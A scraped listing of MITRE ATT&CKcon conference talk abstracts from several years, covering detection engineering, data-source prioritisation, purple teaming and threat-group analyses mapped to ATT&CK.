(Roberto Rodriguez, Cybersecurity Specialist; Jose Luis Rodriguez, Student) \"How do we collect the right data for the detection of specific adversarial techniques?\" That is a very important and common question for organizations planning on leveraging ATT&CK for their defensive strategy. One approach might be reading the data sources metadata available per each technique in the ATT&CK framework. That is a good first step, and it is already helping organizations to integrate the framework with their current security controls. However, as you go deeper into the specific recommended data sources per technique, it is very important to understand that not every technique variation requires the same data sources. In addition, there needs to be a way to validate if what we are collecting aligns with the data analytics being created. In this talk, we will share our current experiences contributing to the \"Data Sources\" section of ATT&CK framework and the Cyber Analytics Repository (CAR) project. We will show how to use pre-captured datasets from our open source project named Mordor to expedite simulation of adversarial techniques and validation of data analytics. In addition, we will show how we leverage Jupyter Notebooks to develop and test data analytics from projects like CAR to finish the validation process and provide recommendations. video slides 21. Prioritizing Data Sources for Minimum Viable Detection (Keith McCammon, Red Canary) MITRE ATT&CK\u00ae is more than a glossary of security terminology that offers us a common language to communicate about threats. While each technique includes a description, it also includes a list of the requisite data sources necessary to observe an adversary leveraging that technique\u2014transforming ATT&CK from a nebulous collection of definitions into a practical tool for improving detection coverage. However, in the same way that you can\u2019t simply build alerts for every technique, you can\u2019t gain access to every data source. How do you effectively prioritize data sources so that you are getting the best returns on your visibility investments? video slides 22. ATT&CK Updates \u2013 Controls Mapping (Mike Long, MITRE) Updates from the ATT&CK Team's very own Mike Long covering controls mapping. video slides 23. The World\u2019s Most Dangerous ATT&CKers (Robert Lipovsk\u00fd, ESET) As a research-oriented cybersecurity company that regularly discloses detailed analyses of cyberattacks to clients and/or the public, the introduction of MITRE ATT&CK as a common language to describe adversary techniques and tactics was certainly welcome. We\u2019ll begin our presentation by introducing exactly how and why we started using ATT&CK, providing examples of mappings in our research publications, as well as the role it plays in enhancing our EDR solutions. We\u2019ll also describe our experience with contributing to the ATT&CK knowledge base. The main part of the talk will be example-driven. Having played a key role in analyzing some of the most significant cyberattacks in history, we\u2019ll go over the most interesting tactics, techniques, and procedures (TTPs) of the adversaries, mapping them to ATT&CK. Specifically, we\u2019ll analyze the TTPs of Sednit (a.k.a. APT28), the group reportedly responsible for the Democratic National Committee hack that affected the US 2016 elections, and Telebots (a.k.a. Sandworm), the group behind the first malware-driven electricity blackouts (BlackEnergy and Industroyer) and, the most damaging cyberattack ever (NotPetya). Finally, we\u2019ll conclude with our analysis of the current threat landscape and trends, and highlight how we anticipate it will shape ATT&CK going forward. video slides 24. Lessons in Purple Teaming with ATT&CK (Daniel Wyleczuk-Stern, Praetorian; Matt Southworth, Priceline, Booking Holdings) For the past year, Praetorian and Priceline have been working together to conduct a series of Purple Team exercises to improve Priceline\u2019s Detection and Response. These exercises utilized tactics, techniques, and procedures (TTPs) from the MITRE ATT&CK framework to baseline Priceline\u2019s telemetry and analysis capabilities. Praetorian leveraged their recently released Metasploit Framework fork to rapidly automate basic TTPs before working cooperatively with Priceline for more advanced tests. Priceline then did the heavy lift of ingesting that data, prioritizing shortcomings, and making strategic and tactical decisions to improve their security program. Through the use of ATT&CK, they were able to trace specific lines of effort back to various TTPs. This traceability helped provide support for various decisions as well as facilitated with prioritization. ATT&CK also provided a common taxonomy when working with vendors when gaps in detection were identified. Finally, ATT&CK helped Priceline track improvements through later rounds of testing to help measure the effectiveness of various improvements. video slides 25.

Lightning Talk: A Love Song for Heat Maps (Brian Donohue, Red Canary) How do you decide where to allocate your security resources and budget? Maybe you've got seasoned security professionals making decisions based on experience and intuition, maybe your decisions are driven by insurance or compliance requirements, or maybe they're completely arbitrary. Whatever the case, we can all associate ATT&CK techniques and data sources with the events we prevent, detect, or respond to. This talk will explore how security professionals can turn their internal security data into community intelligence that enumerates the threats that occur most often, enabling us all to establish data-based priorities that guide the way we spend our money and time\u2014whether we\u2019re buying, developing, or selling security tools. video (no slides) 27. Lightning Talk: Operationalize ATT&CK with Boring Dashboards (Dan Cole, ThreatConnect Inc) Vendors often showcase dashboards with 3D rotating globes, animated bar graphs, and enough colors to fill a Crayola 64 pack. In this talk, I'll show how a simple dashboard of dull, boring, non-flashy, inanimate DATATABLES can be used (along with ATT&CK and a decent intel requirements process) to help analysts stay focused. video (no slides) 28. Lightning Talk: MITRE ATT&CK Maturity Model Mappings from In the Field Observations (Stephan Chenette, AttackIQ) In this lightning talk, I'll present in the field observations of what elements of ATT&CK organizations can put into action at each maturity level of their security program to start or continue to incorporate and operationalize the MITRE ATT&CK framework. video (no slides) 29. Lightning Talk: ATT&CK Poker (Ivan Ninichuck, Cyber Knights) My talk will be a 5 minute introduction to the concept of applying game theory to our use of Att&ck in predicting adversary actions. I am currently designing a poker style card game along these principles and would like to show off what I have so far. video slides 30. Lightning Talk: Tracking and measuring your ATT&CK coverage with ATT&CK2Jira (Mauricio Velazco) Tracking and measuring coverage against the ATT&CK framework can be a challenging task. This lighting talk will introduce Att&ck2Jira, a tool that leverages Jira and the Att&ck navigator that can help blue teams automate this effort. No more spreadsheets! video slides 31. Lightning Talk: STIX in the Mud (Bryson Bort, SCYTHE) CTI today = static solutions of yesterday. STIX currently adequately supports today\u2019s requirements. What is if we could operationalize attacks (ATT&CK) with it? video slides 32. Lightning Talk: ATT&CK, Intelligence, and Micro-Purple Teaming (Emma MacMullan, Federal Reserve) Intel-driven Purple Teaming can enhance simulated attacks by using ATT&CK to create real-time tactical information on current threat actor behaviors, as well as validate existing detections and identify gaps in coverage. This lightning talk will be a snapshot into an ad-hoc side project that showed you don\u2019t need a big report or a lot of man hours to ask some interesting questions; you just need a little spontaneity, a single TTP, and of course, ATT&CK. video (no slides) 33.

State of the ATT&CK (Adam Pennington, MITRE ATT&CK) video slides 3. Mapping to MITRE ATT&CK: Enhancing Operations Through the Tracking of Interactive Intrusion Campaigns.pdf (Jason Wood, Justin Swisher, CrowdStrike) When it comes to understanding and tracking intrusion tradecraft, security teams must have the tools and processes that allow the mapping of hands-on adversary tradecraft. Doing this enables your team to both understand the adversaries and attacks you currently see and observe how these adversaries and attacks evolve over time. This session will explore how a threat hunting team uses MITRE ATT&CK to understand and categorize adversary activity. The team will demonstrate how threat hunters map ATT&CK TTPs by showcasing a recent interactive intrusion against a Linux endpoint and how the framework allowed for granular tracking of tradecraft and enhanced security operations. They will also take a look into the changes in the Linux activity they have observed over time, using the ATT&CK navigator to compare and contrast technique usage. This session will provide insights into how we use MITRE ATT&CK as a powerful resource to track intrusion tradecraft, identify adversary trends, and prepare for attacks of the future. video slides 4. Knowledge for the masses: Storytelling with ATT&CK (Ismael Valenzuela, Jose Luis Sanchez Martinez, Trellix) The Trellix team believes that creating and sharing compelling stories about cyber threats -with ATT&CK- is a powerful way for raising awareness and enabling actionability against cyber threats.In this talk the team will share their experiences leveraging ATT&CK to disseminate Threat knowledge to different audiences (Software Development teams, Managers, Threat detection engineers, Threat hunters, Cyber Threat Analysts, Support Engineers, upper management, etc.).They will show concrete examples and representations created with ATT&CK to describe the threats at different levels, including: 1) an Attack Path graph that shows the overall flow of the attack; 2) Tactic-specific TTP summary tables and graphs; 3) very detailed, step-by-step description of the attacker's behaviors. video slides 5. Tracking Noisy Behavior and Risk-Based Alerting with ATT&CK (Haylee Mills, Splunk) Having ATT&CK to identify threats, prioritize data sources, and improve security posture has been a huge step forward for our industry, but how do we actualize those insights for better detection and alerting? By shifting to observations of behavior over one-to-one direct alerts, noisy datasets become valuable treasure troves with ATT&CK metadata. Additionally, we can begin to look at detection and threat hunting on behavior instead of users or systems. In this presentation, Haylee will discuss the shift in mindset and the nuts and bolts of detections that leverage this metadata in Splunk, but the concept can be applied with custom tools to any valuable security dataset. video slides 6. ATT&CK Updates- Defensive ATT&CK (Lex Crumpton, MITRE ATT&CK) video slides 7. Would you Rather Have Telemetry into 2 Attacks or 20? An Insight Into Highly Valued Data Sources (Jonny Johnson, Olaf Hartong, Red Canary and FalconForce) As defenders, we often find ourselves wanting \"more\" data. But why? Will this new data provide a lot of value or is it for a very niche circumstance? How many attacks does it apply to? Are we leveraging previous data sources to their full capability? Within this talk, Olaf and Jonny will walk through different data sources they leverage more than most when analyzing data within environments, why they do, and what these data sources do and can provide in terms of value to a defender. video slides 8. ATT&CK Metaverse - Exploring the Limitations of Applying ATT&CK (Gert-Jan Bruggink, Venation) Since it's inception in 2015, the ATT&CK framework has achieved widespread adoption, with recent studies suggesting over 80 percent of companies using the framework for cyber security. Over the last seven years, a variety of use cases has been explored with different measures of success. In this presentation, Gert-Jan will explore applying the ATT&CK framework in scenario-based defense. When adopting a scenario approach, security teams collaborate to fuse their understanding of certain situations into scenarios. For example, addressing different hypotheses that can be explained to leadership and specialist teams alike. This approach requires more than \"just\" breaking down everything into tactics, techniques, and procedures. Some stakeholders might not understand that. For example, some might want to tell a good story about adversaries while others want to translate their understanding of intrusions into a sequential pattern. The objective of this talk is to explore how the granularity of the framework supports creation of scenarios, the limitations in the current approach to ATT&CK when building scenarios across different stakeholders, and addressing potential areas the \"language of ATT&CK\" can evolve towards over the next 5 years. video slides 9. It's just a jump to the left (of boom): Prioritizing detection implementation with intelligence and ATT&CK (Lindsay Kaye, Scott Small, Recorded Future) Many organizations ask: \"Where do I start, and where do I go next\" when prioritizing implementation of behavior-based detections? We often hear \"use threat intelligence!\" but your goals must be qualified and quantified in order to properly prioritize the most relevant TTPs. A wealth of open-sourced, ATT&CK-mapped resources now exists, giving security teams greater access to both detections and red team tests they can implement, but intelligence (also aligned with ATT&CK), is essential to provide necessary context to ensure that detection efforts are focused effectively.This session will discuss a new approach to the prioritization challenge, starting with an analysis of the current defensive landscape, as measured by ATT&CK coverage for more than a dozen detection repositories and technologies, and guidance on sourcing TTP intelligence. The team will then show how real-world defensive strategies can be strengthened by encompassing a full-spectrum view of threat detection, including the implementation of YARA, Sigma, and Snort in security appliances. Critically, alignment of both intelligence and defenses with ATT&CK enables defenders to move the focus of detection efforts to indications of malicious behavior before the final payload is deployed, where controls are most effective at preventing serious damage to the organization. video slides 10. ATT&CK Updates- Campaigns (Matt Malone, MITRE ATT&CK) video slides 11. Landing on Jupyter: The transformative power of data-driven storytelling for security operations (Jose Barajas, Stephan Chenette, AttackIQ) Every cybersecurity leader wants visibility into the health of their security program. Yet teams suffer with disparate data streams - CTI teams and the SOC often use separate Excel spreadsheets, an anachronistic practice - and silos constrain their ability to operate effectively. Enter the Jupyter notebook, an open-source computational notebook that researchers use to combine code, computing output, text, and media into a single interface. In this talk, we share three stories of how organizations use Jupyter notebooks to align ATT&CK-based attack flows to the security program, generating data about detection and prevention failures, defensive gaps, and longitudinal performance. By using Jupyter notebooks in this way, teams can better leverage ATT&CK for security effectiveness. It becomes less of a bingo card and more of a strategic tool for understanding the health of the program against big tactics (I.e., lateral movement), defensive gaps (I.e., micro-segmentation), and the team's performance. video slides 12. The ATT&CK Philharmonic (Ivan Ninichuck, Andy Shepard, Siemplify) The MITRE ATT&CK framework has improved many areas within the infosec workflow. But many of these select areas are those that are relatively isolated from the tactical operations faced every day by lower or mid-tier analysts. When faced with alert fatigue and an ever-growing number of data sources, the impact of ATT&CK can become esoteric to non-existent. In this presentation experts from Siemplify propose the problem be looked at like an orchestra with its dozens of instrument types. Without a conductor to guide each section there would only be noise, but with the conductor leading, beautiful symphonies can now be played. The Siemplify team plan to show how a SOAR platform can be that conductor using the ATT&CK framework as its sheet music, and turn the constant noise into a threat intel driven security program. video slides 13. Automating the mundanity of technique IDs with ATT&CK Detections Collector (Marcus LaFerrera, Ryan Kovar, Splunk) Since the release of MITRE ATT&CK, vendors and governmental bodies have begun mapping their security blogs, whitepapers, and threat intel reports to ATT&CK TTPs, which is incredible! Vendors have then begun mapping their detections to those mapped TTPs, which is even more awesome! What is not awesome is dissecting a piece of prose for all of the specific embedded ATT&CK technique IDs and then mapping them to your detections to determine coverage. Over the last year, the team at Splunk has spent more time doing this than they would like to admit, so they wrote a tool to do it for them and want to share it with the world. Join the Splunk team as they tell the world about ATT&CK Detections Collector (ADC). ADC is an open-source python tool that will allow you to extract MITRE technique IDs from a third-party URLs and output them into a file. If you use Splunk, the team even maps them to their existing (previously mapped) detection corpus. They even added the ability to export them into a navigator json for fun, profit, or (at least) better visualization! video slides 14. The ATT&CK Latin American APT Playbook (Santiago Pontiroli, Dmitry Bestuzhev, Kaspersky) Financially motivated cyber-attacks thrive in emerging Latin American markets. However, there's room for locally grown threat actors operating in the cyber espionage field as well. During the last decade, this includes but is not limited to Blind Eagle, Puppeteer, Machete, Poseidon, and others. We also saw foreign operations targeting specific assets in Latin America, still connected to certain regional sources.Since the threat actors' origin, culture, and language is often different, it's not uncommon for tactics, techniques, and procedures (TTPs) to present marked differences. As a result of our regional expertise and experience, we created MITRE's ATT&CK play-by-play mappings to help other analysts understand regional actors. If you are interested in threat intelligence and what's going on in Latin America, this presentation is for you. Our work is based only on real-world attackers and their operations, including those not publicly known, such as COVID-19 Machete's targeted campaign. video slides 15. Mapping ATT&CK Techniques to ENGAGE Activities (David Barroso, CounterCraft) When an adversary engages in a specific behavior, they are vulnerable to expose an unintended weakness. By looking at each ATT&CK technique, we can examine the weaknesses revealed and identify an engagement activity or activities to exploit this weakness.During the presentation we will see some real examples of how we can use different ATT&CK techniques in order to plan different adversary engagement activities. video slides 16. When Insiders ATT&CK! (Matt Snyder, VMWare) Insider threats are some of the most treacherous and every organization is susceptible: it's estimated that theft of Intellectual Property alone exceeds $600 billion a year. Armed with intimate knowledge of your organization and masked as legitimate business, often these attacks go unnoticed until it's too late and the damage is done. To make matters worse, threat actors are now trying to lure employees with the promise of large paydays to help carry out attacks. These advanced attacks require advanced solutions, and we are going to demonstrate how we are using the MITRE ATT&CK framework to proactively combat these threats. Armed with these tactics and techniques, we show you how to build intelligent detections to help secure even the toughest of environments. video slides 17. ATT&CK Updates- ATT&CK for ICS (Otis Alexander, MITRE ATT&CK) video slides 18. Exploring how Students Map Social Engineering Techniques to the ATT&CK Framework During a Real-Time Cybersecurity Exercise (Aunshul Rege, Katorah Williams) Social engineering (SE) is a technique used by cybercriminals to psychologically manipulate individuals into disclosing sensitive information and providing unauthorized access. Penetration testers are tasked with simulating targeted attacks on a company's system to determine any weaknesses in their environment. The 2021 Summer SE Pen Test Competition allowed students to experience SE pen testing in a safe and ethical way. Student teams were \"hired\" to conduct a SE pen test on the CARE Lab (run by the authors) and their employees (the authors themselves)! Teams had to use OSINT, phishing, and vishing in real-time to target the lab, develop attack playbooks, and map the techniques to the ATT&CK framework. This talk shares the application of ATT&CK in cybersecurity education. Specifically, it (i) focuses on how students map their SE attack playbooks to the ATT&CK framework, (ii) compares/contrasts SE techniques across various student groups: 6 graduate teams, 9 undergraduate teams, and 1 high school team, and (iii) how ATT&CK can be used for SE. video slides 19. ATT&CKing the Red/Blue Divide (Fred Frey, Jonathan Mulholland, SnapAttack) Atomic Red Team and Sigma are the largest open-source attack simulation and analytic projects. Many organizations utilize one or both internally for security controls validation or supplementing their detections and alerts. Building on the work from these two great communities, we smashed (scientific-term) the attacks and analytics together and applied data science to analyze the results. We'll describe our methodology and testing framework, show the real-world MITRE ATT&CK coverage and gaps, discuss our algorithms for calculating analytic similarity, identifying log sources for a technique, and determining the best analytics to deploy that maximizes ATT&CK coverage. This project aims to: - Bring a measurable testing rigor to community analytics to improve adoption - Test every analytic against every attack, validating the true positive detection - Understand the log sources required to detect specific attack techniques - Apply data science to identify analytic similarity (reduce community duplication) - Identify gaps between the projects' analytics without attack simulations; attack simulations without detections; missing or incorrect MITRE ATT&CK labels, etc - Automate the process so insights can stay up to date with new attack/analytic contributions over time - Share our analysis back to the community to improve these projects video slides 20. ATT&CK Updates- ATT&CK for mac/Linux (Cat Self, MITRE ATT&CK) video slides 21. What is ATT&CK coverage, anyway? Breadth and depth analysis with Atomic Red Team (Brian Donohue, Red Canary) This presentation will highlight the Atomic Red Team project's efforts to define and increase the test coverage of MITRE ATT&CK techniques. We'll describe the challenges we encountered in defining what \"coverage\" means in the context of an ATT&CK-based framework, and how to use that definition to improve an open source project that's used by a diverse audience of practitioners to satisfy an equally diverse array of needs. The audience will learn how the Atomic Red Team maintainers standardize and categorize atomic tests, perform gap analysis to achieve deep technique-level coverage and broad matrix-level coverage, and quickly fill those gaps with new tests. video slides 22. ATT&CKING Containers in The Cloud (Jared Stroud, Lacework) Adversaries target common cloud misconfigurations in container-focused workflows for initial access. Whether this is Docker or Kubernetes environments, Lacework Labs has identified adversaries attempting to deploy malicious container images (T1610) , mine Cryptocurrency (T1496), and deploy C2 agents. Defenders new to the container space may be unaware of the built-in capabilities popular container runtime engines have that can help defend against rogue containers being deployed into their environment. Attendees will walk away with an understanding of what these attack patterns look like based on honeypot data Lacework has gathered over the past year, as well as techniques on how to defend their own container focused workloads. video slides 23. Threat Modelling - It's not just for developers (Tim Wadhwa-Brown, Cisco) The purpose of this session will be to look at how you can take public information about threat actors, vulnerabilities, and incidents and use them to build better defenses, utilizing ATT&CK along the way to align your security organization to the people and assets that matter.Stories are critical to how humans learn, so this session will leverage a story book approach to give the audience some ideas on approaches they could use. Tim will take the audience through 3 real world examples where he has leveraged ATT&CK to drive operational improvement. The premise of each story will be real, although some of the details will be apocryphal to protect the innocent.One story will focus on defending a network, one will look at adversary detection, while the final one will look at responding to an active attack and in each case, Tim will guide the audience to think about the kinds of data sources that ATT&CK tracks, that they might call upon to achieve a successful outcome. video slides 24.

Advancing Infosec, Keynote Presentation (John Lambert, Microsoft) In this presentation at MITRE ATT&CKcon, John Lambert, Distinguished Engineer and General Manager of the Threat Intelligence Center at Microsoft, presents \u201cAdvancing InfoSec: Towards an Open, Shareable, Contributor-Friendly Model of Speeding InfoSec Learning.\u201d The talk details a model where infosec know-how is more organized, community sourced, vendor neutral, and shareable by all defenders. It includes a call for the community to publish mappings of ATT&CK techniques used by groups. video slides 2. How Did We Get Here? (Blake Strom and Richard Struse, MITRE) Richard Struse, MITRE\u2019s Principal Strategist for Cyber Threat Intelligence, interviews Blake Strom, MITRE\u2019s principal ATT&CK engineer, on how MITRE ATT&CK was developed, its current state, and future direction. video (no slides) 3. Operationalizing ATT&CK (Bryson Bort, SCYTHE) How do you turn a theoretical framework into something useful? ATT&CK provides a common language while allowing for the development of sophisticated defenses. video slides 4. Summiting the Pyramid of Pain: Operationalizing ATT&CK (Emma MacMullan and Justin Sherenco, General Electric) Operationalizing the ATT&CK framework has enabled GE to deploy custom detection to evolving threat actor behaviors. By leveraging an in-house developed tool called TIAMAT (Tactical Intelligence Adversary Mapping and Analysis Tool) the ATT&CK framework is incorporated into an end-to-end operational process from intelligence collection to customized detection deployment. The designing of this new operational process is examined, and a use case presented of how examining a historical incident led to a new method of deploying detection based on ATT&CK and the detection of previously undiscovered activity. There is also a demo that walks the audience through the end-to-end process and explains TIAMATs capabilities. video slides 5. ATT&CK: All the Things (Neelsen Cyrus and David Thompson, USAA) USAA has utilized the ATT&CK framework as a unique means to map their current detection infrastructure and assess their ability to defend against the most relevant threats to their network. In this presentation they share some lessons learned during their journey with ATT&CK leading to identified best practices for workflow integration through team composition and custom tool development. video slides 6. Agile Continuous Improvement Using ATT&CK (Matthew Stiak and Jason Sinchak, Level Nine Group) Organizations implementing SOC/IR with limited resources confront two issues: prioritization and measurement. Any successful SOC/IR implementation must have a robust way to prioritize content development and technology investment, and measurements that reflect the effectiveness of the investments to drive the next round of prioritization. Organizations can maximize their return on investment by using MITRE ATT&CK to focus resources on repeatable behaviors and provide a simple structure to reporting how well the organization can detect, block, or respond to those behaviors. During this talk security testing and operations experts Matt Stiak and Jason Sinchak share their thoughts on how to operationalize a continuous improvement and measurement framework based on MITRE ATT&CK, as well as some early results from their implementation of that framework. video slides 7. Vendor Panel Discussion (Moderated by Ed Amoroso, TAG Cyber) Panelists: Devon Kerr, Endgame Jen Miller-Osborn, Unit 42 at Palo Alto Networks Ross Rustici, Cybereason Carl Wright, ATTACKIQ Ed Amoroso moderates a panel that discusses: The role of a threat taxonomy in the design of a commercial solution How commercial providers keep up with a changing threat landscape Stories around the most intriguing threat scenarios or methods seen Requirements from commercial clients regarding threat frameworks video (no slides) 8. VCAF: Expanding the ATT&CK Framework to cover VERIS Threat Action Varieties (Alex Pinto, Verizon) The Vocabulary for Event Recording and Incident Sharing (VERIS) is a set of metrics designed to provide a common language for describing security incidents in a structured and repeatable manner. VERIS has been the base analysis framework for supporting the Verizon Data Breach Investigations Report (DBIR) since its inception. However, as organizations work to interpret the richness of information present on the DBIR to a more tactical level, the Threat Action Varieties available on VERIS fail to capture the detail present on the incidents recorded. This talk presents the Verizon Common Attack Framework (VCAF), an effort from the Security Data Science team and the DBIR team in Verizon to expand and map the ATT&CK framework in alignment with the DBIR Threat Action Varieties to provide this much-sought level of granularity in recording and analyzing recorded breaches. Additionally, this talk describes possible outcomes when this data is available and organized as such. Examples include applying DBIR-inspired attack vector analytics upon ATT&CK layer information, effectively identifying optimal control choke points on the attack graphs according to specific industries covered by the DBIR. video slides 9. Playing Devil\u2019s Advocate to Security Initiatives with ATT&CK (David Middlehurst, Trustwave) This talk presents a case study which demonstrates that we should consider the knowledge and wisdom contained within ATT&CK in all organizational security initiatives to make sure by fixing one thing we have not just created an opportunity. The presentation shows how to leverage the analysis and classification of APT tactics and procedures (TTP) to guide research into new and novel techniques, specifically focusing on exfiltration and command and control. DNS over HTTPS (DoH) aims to increase user privacy and security by preventing eavesdropping and manipulation of DNS data by man-in-the-middle attacks. Major web browsers such as Firefox are considering its implementation by default. But what could this possibly mean for exfiltration and command and control? This session provides an end-to-end demo that shows DoH being implemented to provide full command and control in a popular attack simulation framework and discusses associated mitigations. video slides 10. From Red VS Blue to Red Loves Blue (Olaf Hartong and Vincent Van Mieghem, Deloitte) This session discusses Deloitte\u2019s purple teaming approach which is using ATT&CK as a guiding principle to help both teams improve. This session shows how this works in a customer scenario, how to scope that scenario, how to plan the scenario and choose the various TTPs to be covered to how we assist the customers blue team in understanding the TTPs and helping them design detective capabilities for them. When the Blue Team is able to connect the dots from offensive activities in the network and what they see in their logs, rewalls, SIEMs, etc. they have the ability to fully understand what adversaries do and what the TTP\u2019s of attackers actually look like if they are active in their network. It\u2019s much easier to find the needle in the haystack if you know there is a needle to find to begin with. Purple teaming is providing this pointy needle, used to accelerate the Blue Team. video slides 11. Helping Your Non-Security Executives Understand ATT&CK in 10 Minutes or Less (Elly Searle, CrowdStrike) ATT&CK is an incredibly valuable framework for describing and analyzing what\u2019s happening in your environment. Sometimes security professionals not only need a way to understand, but also need a way to clearly articulate to non-security leadership to gain support and investment in needed resourcing. Using UX design methods, CrowdStrike came up with a mental model and more conversational terms to help anyone quickly parse the big picture. video slides 12. ATT&CK as a Teacher (Travis Smith, Tripwire) ATT&CK is valuable for those of us who are heads down in security day in and day out. But what about using ATT&CK to each college interns about security? This presentation details how Tripwire used ATT&CK to build- out a new training regimen for summer interns. By going through and finding quick wins, Tripwire\u2019s interns were actively engaged in learning about security. The detailed break downs of ATT&CK were greatly beneficial in helping teach security concepts to those who were not yet familiar with them. This session shows the program details and how you might be able to adapt it to your requirements. video slides 13. Detection Philosophy, Evolution & ATT&CK (Fred Stankowski and Travis McWaters, Pepsico) This lightning talk is a brief discussion around how PepsiCo is managing their \u2018detection catalog\u2019 and how it maps and is enhanced by the MITRE ATT&CK framework. video slides 14. Decision Analysis Applications in Threat Analysis Frameworks (Emily Shawgo, PNC) In the modern age, all organizations face threats from various types of cyber attacks. Although great strides have been made to consider human factors in cybersecurity and to become more proactive in threat analysis, security is still generally a reactive, technical field. The research presented in this talk seeks to develop a framework which adapts the existing MITRE ATT&CK framework to look at attacks in a less linear, more human-centered framework that focuses on the capabilities and decisions of the threat actor. The framework approaches threat analysis from a binary assessment of success vs. failure in order to see the entire attack and consider the potential for a number of methods and attempts made in a single attack. A detailed methodology and sample charts are included for a reference and a starting point in developing one\u2019s own personalized charts, and recommendations are made for ways to integrate this methodology into the risk management process. video slides 15. Building an Atomic Testing Program (Brian Beyer, Red Canary) Red Canary\u2019s applied research team built the Atomic Red Team project based on a simple idea: encourage security teams to test their systems. Leveraging MITRE ATT&CK, the series of small tests can be combined into chains to help teams gain insight into gaps in their security program at all levels. This talk describes how to use Atomic Red Team and how MITRE ATT&CK is leveraged to write the tests. video slides 16. 5 Ways to Screw Up Your Security Program with ATT&CK (Kyle Rainey, Red Canary) Over the past year there has been a significant uptick in adoption of MITRE ATT&CK. Adoption of a common language and taxonomy for adversarial tactics and techniques comes with a few unspoken traps. This talk is to bring awareness to the pitfalls of implementing and adopting any variation of MITRE ATT&CK and how you can avoid falling for them. video (no slides) 17. ATT&CK + OSQuery = Love (Scott Lundgren, Carbon Black) MITRE ATT&CK is cool and it's open, with a heavy emphasis on how attackers behave on the endpoint. OSQuery is cool and it's open, with a heavy emphasis on endpoint visibility. This talk focuses on an open-source extension to OSQuery that provides a free, repeatable mechanism to identify and detect ATT&CK techniques. video slides 18. An ATT&CK Review of 200 Hybrid-Analysis Submissions (James Lerud, Verodin) How can you consistently categorize Techniques a given piece of malware uses? The answer to this question could be provided by sandbox vendors. CrowdStrike has embraced ATT&CK by including Technique detection in their public Hybrid-Analysis reports. This talk reviews the submission results of 100 malicious and 100 benign executables. video slides 19. From Technique to Detection (Paul Ewing and Ross Wolf, Endgame) This session is a practical guide for a rapid prototyping of ATT&CK-based analytics \u2013 from technique to detection. video slides 20. Hunters ATT&CKing with the Data (Roberto Rodriguez, SpecterOps; Jose Luis Rodriguez, Student) With the development of the MITRE ATT&CK framework and its categorization of adversary activity during the attack cycle, understanding what to hunt for has become easier and more efficient than ever. However, organizations are still struggling to understand how they can prioritize the development of hunt hypothesis, assess their current security posture, and develop the right analytics with the help of ATT&CK. Even though there are several ways to utilize ATT&CK to accomplish those goals, there are only a few that are focusing primarily on the data that is currently being collected to drive the success of a hunt program. This presentation shows how organizations can benefit from mapping their current visibility from a data perspective to the ATT&CK framework. It focuses on how to identify, document, standardize and model current available data to enhance a hunt program. It presents an updated ThreatHunter-Playbook, a Kibana ATT&CK dashboard, a new project named Open Source Security Events Metadata known as OSSEM and expands on the \u201cdata sources\u201d section already provided by ATT&CK on most of the documented adversarial techniques. video slides 21. Analyzing Targeted Intrusions Through the Lens of the ATT&CK Framework (Karl Scheuerman, CrowdStrike) The security community is quickly adopting the MITRE ATT&CK matrix as a framework for understanding and analyzing targeted intrusions. However, one of its potential limitations is a lack of detailed historical intrusion data for developing accurate and thorough ATT&CK-based threat modeling. Crowdstrike\u2019s Falcon OverWatch threat hunting team analyzes adversary behavior on a regular basis. The amount of OverWatch's malicious intrusion data is significant given the valuable telemetry delivered by Falcon's endpoint technology. As a result, CrowdStrike has amassed a rich data library of malicious activity that can be applied to the ATT&CK model. The OverWatch Strategic Counter-Adversary Research (SCAR) team has now evaluated all OverWatch intrusion data since January 1, 2018 through the lens of the ATT&CK framework. This presentation presents these findings and highlights cases of unique adversary TTP use. The results of this analysis will provide a baseline from which CrowdStrike can better identify changes in threat actor TTP trends moving forward. In addition, the presentation discusses limitations in this type of research. video (no slides) 22. End User Panel Disussion (Moderated by Katie Nickels, MITRE) Panelists: Jon Bagg, Booz Allen Hamilton Daniel Bernholz, JPMorgan Chase Dave Westgard, Target Corporation Katie Nickels moderates a panel that discusses: What are the best practices and lessons learned for organizations who are just getting started with ATT&CK? What has been the most difficult part of implementing ATT&CK? What changes could be made to ATT&CK to make it easier for others in the future? Where would you like to see ATT&CK go in the future that would help make it more useful for your team? What else haven\u2019t we talked about that you think is important for someone who wants to use ATT&CK to know? video (no slides) 23. Sofacy 2018 and the Adversary Playbook (Robert Falcone, Palo Alto Networks) Unit 42 researches threat activity and publishes detailed reports on attack campaigns launched by these adversaries. One of these adversaries, known as Sofacy, has been carrying out attack campaigns on high profile targets for many years and has continued into 2018. To understand how to defend against these threats, an analyst has to read our reports, process them and mentally map them to their defenses. In most cases we expect readers just \"block\" all of the indicators we include in the report and assume they are covered. Last year we started using ATT&CK to codify the techniques we observed, linking those techniques to indicator patterns and encoding them into STIX 2 objects, with the goal of creating something that a defender can use to answer the question: \"How am I defending against this adversary?\" We call these documents, \"Adversary Playbooks\" as they contain our best approximation of how the adversary launches their attacks. This talk describes the concept of Adversary Playbooks, as well as provides an overview of the attack campaigns Unit 42 has attributed to the Sofacy group in 2018. It uses the discussed attacks to show how these playbooks are constructed and explain some of the challenges of incorporating ATT&CK and STIX 2 together for this purpose. video slides 24. From Automation to Analytics: Simulating the Adversary to Create Better Detections (David Herrald and Ryan Kovar, Splunk) Security teams have more detection tools at their disposal than ever before, yet most are still struggling to find even the most basic malicious activity occurring in their environments. Building effective detection analytics requires realistic data and the ability to iterate quickly in a rapid analytic development cycle. This talk introduces a full lifecycle attack simulation and analytics development environment featuring the MITRE ATT&CK framework and the Atomic Red Team project using Splunk and Splunk Phantom mapped to an imaginary APT group, Taedonggang. It focuses on how security teams can use such a system to rapidly develop and share new detection analytics. Links to all components referenced in the talk are provided, including a cloud-based dataset that can act as a playground for users who want to see the results of the activity. video slides 25. The Use of Game Theory with MITRE ATT&CK (Matt Summers and Nick Dunn, NCC Group) This presentation shows how the use of game theory with the ATT&CK framework can produce better attack and defense strategies. video slides Sponsors "

